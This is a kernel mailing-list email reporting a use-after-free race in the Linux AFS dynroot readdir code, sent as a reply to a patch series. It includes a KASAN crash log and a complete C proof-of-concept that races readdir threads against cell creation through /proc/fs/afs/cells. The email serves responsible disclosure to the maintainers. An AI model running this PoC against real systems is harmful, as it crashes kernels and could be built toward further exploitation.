Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 76F88349CEF;
	Mon, 22 Jun 2026 20:29:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782160162; cv=none; b=XGyOg9vW7nFhBEQ3/fiEFwF/hExk3GNET7FGmZPzU1A4A1ygF4o3iFZvBBu/U9WDOX6IBvTcWrraKdus/swEn8DpZWs9Q84QheiXCdskmbHaYyqzEj64JooImRd0b2Sm/04jWH1Ehq4kXOdNcpj03NaAhgL3isw3ZpIusv6e71o=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782160162; c=relaxed/simple;
	bh=kgcz6IrpBX4EdGS3pO1Ty6JaSJh5f75Igo26S0qPUkI=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=cpGJISqfwIRjdZa9HdfZTTF3A+h6l6ybeOpJS+hM348nu+3DeEMwj9mWjGZJWXaU/AYuD+/hFm0KqAnoDKjdthtHJKQ8p3DKdT08SBlEAecK+EiPGX0PezO7RTuFftdWbnWFQfuLkdXTnO8rLtcKzzw4G/5yfuWwcUXzw8Q8pww=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=g4xSkSzY; arc=none smtp.client-ip=162.62.57.87
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="g4xSkSzY"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782160154; bh=mr2N75N58tgfZd4T918jt0X4mMZJv3Lc0CiWh3oXqec=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=g4xSkSzYslk+kK/LaZDsye0BWzeKy1X7hI37X9X8RifMFO+oaeAhdTZac1vF/F8gz
	 Sigp8HJJZy4WoEU5L6eL9DGe1mHyeD+RsPdrUIuvmvyX0FS741KAe3u3Gxa/bLtdYK
	 GK30uS6F/sJt0yMQ7iuwcBTNIAi67gddS119pOac=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszb51-0.qq.com (NewEsmtp) with SMTP
	id 74C0A854; Tue, 23 Jun 2026 04:29:12 +0800
X-QQ-mid: xmsmtpt1782160152trq9oou5u
Message-ID: <tencent_BF6A8D972816650FBCF2C95BC84288BB7008@qq.com>
X-QQ-XMAILINFO: NJFEnoWFOBdNhCWuLdcQeMHS2arsnfJDun7ryIl5mvikPeHAlFybzxURbEoBhV
	 g1Bq/p2BUBRDmaEvOm0us288Ffh46HM+IbZD0rZ9H4DObhGeuYxpkeqPFii27JeRT44t3QnO99B6
	 ybm0MAc46KQ+8FeIS99jLHlkv1qGIclAKtvsxzPc5KxyQikFueZoboI2PWT5HC2z0XI4PssIEwTG
	 p7NPscIonLYfn3AYh2eAhxYYyEUEiDtUG5UPblDUUgYxaVbThZLb7UaM8DN4VpJbWh1vS+OqnGGm
	 zBng0HJwIE7H+scU8AGOS/PF6TR3CoUDDj/O+g708MY9ng/6UC2TWQBGjF5qey5TL9F7pRTGe2na
	 ulSFl4tTLOwY0+HzeF6qfeeJpRHqHnmrmcGZPPs710E9nGb2eBNfgdH3rKEhFyma4jxj33up6lv2
	 Z5phaKNa1F3BsBrHx2AyCnFjRWPfQPD1BW/yCqvs+tag4Vti5DQuVIp8WQFMq2ylyBuiVOx6raBG
	 f2KDtl62fnXi5Wytn34NAkuFgdEY2Hy2I73PZJUoKgIQsluiGDj1Z58QB1ekT6ud+VsxrGGdYzCd
	 Sx3ggxi8iXG7oeqOHrWx5a64Vpq1MxH/Sqzbd9LUgG/5T5fG8KbGwkgZfkxKImOxwzvnC3lyWV2X
	 2HoarSJKNO4TucD4MjcdRL+/eTWXxu3jpchWVcIt41x8E5SprODy/gUfEgebPiNHdxyyP/NN05lT
	 vUGN/IhpHzmleeRzflHOTFmw3X1yObJVZQ208RRVk+Sqj4x10o9y9+CUW2xugXVAsL9miZyJ4j/B
	 fy2/38V9lcVVyN03MODkEActRf13vXqn/hZUxvYue8TU84SdT4LmF/r6Al4gtXH6jG5RYRXte55H
	 f8MNZ5otEpyczwK9esFLz0Up/p/USUx9GrdmAmJb+kaTlHzswJO6DZ9nu0sVseQZuNVjND0rw/C1
	 m4JoK3PQ85DUjV9dKK2OjlISrBFHuzrV/If1dHab/64OPJZ4LTE/foZWkQQmzpSoQxe0z4Iw0W+e
	 vbRoAG/9AY+8teT94ym0nLuIWJnxmzLq/pbZwefFaY0FC6ClLqLnRUaumzWszyXVn1CPFJGa9Tcm
	 pCMj4Wp5FzVNCrM/XVDzIm1kAPYxHZux4/YjUjbgiKU+uNjACcE277oPicqdZxZR58zDQH
X-QQ-XMRINFO: OWPUhxQsoeAVwkVaQIEGSKwwgKCxK/fD5g==
X-OQ-MSGID: <5253a6d8-41e0-47c6-ba85-37cc50603a29@qq.com>
Date: Tue, 23 Jun 2026 04:29:11 +0800
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3 11/20] afs: Fix misplaced inc of net->cells_outstanding
To: David Howells <dhowells@redhat.com>,
 Christian Brauner <christian@brauner.io>
Cc: Marc Dionne <marc.dionne@auristor.com>, linux-afs@lists.infradead.org,
 linux-fsdevel@vger.kernel.org, linux-kernel@vger.kernel.org,
 Hillf Danton <hdanton@sina.com>
References: <20260618155141.2513212-1-dhowells@redhat.com>
 <20260618155141.2513212-12-dhowells@redhat.com>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260618155141.2513212-12-dhowells@redhat.com>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi David,

I came across the Sashiko AI review [1] of this series and was able to
reproduce a use-after-free in the AFS dynroot readdir path.  The review
noted this is a pre-existing issue (not introduced by your patch), but
since this patch touches nearby code in the same file, I wanted to share
the concrete reproduction evidence.

The core problem is that afs_dynroot_readdir_cells() iterates over
net->cells_dyn_ino via idr_get_next() without holding rcu_read_lock():

   fs/afs/dynroot.c:
   cell = idr_get_next(&net->cells_dyn_ino, &ix);
   ...
   dir_emit(..., cell->name, cell->name_len, ...);

The dir_emit() call can sleep, allowing an RCU grace period to pass.
Meanwhile, afs_cell_destroy() (invoked via call_rcu) can idr_remove()
and kfree() the cell while the reader is still traversing it.  This
results in a slab-use-after-free when the reader accesses cell->name or
cell->state.

[Reproduction]

The PoC mounts an AFS dynroot filesystem, creates 500 cells to populate
the IDR radix tree, then races two readdir threads against two threads
that repeatedly trigger cell creation and destruction via
/proc/fs/afs/cells.  The UAF triggers deterministically within 2 minutes.

[Crash log — kernel 7.1.0-next-20260618, CONFIG_KASAN=y, SMP]

   BUG: KASAN: slab-use-after-free in memchr+0x71/0x80
   Read of size 1 at addr ffff888024a7dce0 by task poc/12759

   Call Trace:
    <TASK>
    dump_stack_lvl
    print_report
    kasan_report
    memchr+0x71/0x80
    verify_dirent_name+0x42/0x60
    filldir64+0x45/0x5f0

The crash is in verify_dirent_name() → memchr() reading a cell->name
string that was freed via afs_cell_destroy() → kfree() while the
readdir iteration was in progress.

The PoC is attached.  It compiles with:

   gcc -o poc poc.c -static -lpthread

[1] 
https://sashiko.dev/#/patchset/20260618155141.2513212-1-dhowells%40redhat.com
     (Sashiko AI code review — "Use-After-Free", Severity: High)

Thanks,
XIAO

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>

static volatile int stop = 0;

static void *readdir_race(void *arg)
{
     const char *mp = (const char *)arg;
     char buf[65536];
     while (!stop) {
         int fd = open(mp, O_RDONLY | O_DIRECTORY);
         if (fd < 0) continue;
         while (!stop) {
             ssize_t n = syscall(SYS_getdents64, fd, buf, sizeof(buf));
             if (n <= 0) break;
         }
         close(fd);
         sched_yield();
     }
     return NULL;
}

/* Create many cells that will collide when re-added, causing
  * afs_put_cell on the candidate -> call_rcu -> kfree while readdir
  * is traversing the IDR */
static void *cell_collider(void *arg)
{
     int pfd = open("/proc/fs/afs/cells", O_WRONLY);
     if (pfd < 0) return NULL;

     char cmd[64];
     /* First batch: create 500 cells */
     for (int i = 0; i < 500; i++) {
         snprintf(cmd, sizeof(cmd), "add cell_%d", i);
         write(pfd, cmd, strlen(cmd));
     }

     /* Now race: repeatedly trigger cell_already_exists path.
      * Each "add" for existing name creates candidate, adds to IDR,
      * then frees it via afs_put_candiate -> call_rcu -> kfree */
     for (int iter = 0; !stop && iter < 200000; iter++) {
         snprintf(cmd, sizeof(cmd), "add cell_%d", iter & 0x1ff);
         write(pfd, cmd, strlen(cmd));
         if ((iter & 0xfff) == 0) sched_yield();
     }
     close(pfd);
     return NULL;
}

int main(void)
{
     pthread_t t1, t2, t3, t4;
     const char *mp = "/mnt/afs";

     printf("[+] AFS dynroot UAF PoC v5\n");

     mkdir(mp, 0755);
     if (mount("none", mp, "afs", 0, "dyn") < 0) {
         perror("mount");
         return 1;
     }
     printf("[+] Mounted AFS dynroot\n");

     printf("[+] Starting 2 readers + 2 cell colliders...\n");
     pthread_create(&t1, NULL, readdir_race, (void *)mp);
     pthread_create(&t2, NULL, readdir_race, (void *)mp);
     pthread_create(&t3, NULL, cell_collider, NULL);
     pthread_create(&t4, NULL, cell_collider, NULL);

     sleep(120);
     stop = 1;
     pthread_join(t1, NULL);
     pthread_join(t2, NULL);
     pthread_join(t3, NULL);
     pthread_join(t4, NULL);

     printf("[+] Checking dmesg:\n");
     fflush(stdout);
     system("dmesg | grep -i -A5 
'BUG:\\|KASAN\\|UAF\\|dynroot_readdir\\|afs_cell_destroy' | head -80");
     system("dmesg | tail -20");

     umount2(mp, MNT_DETACH);
     rmdir(mp);
     return 0;
}


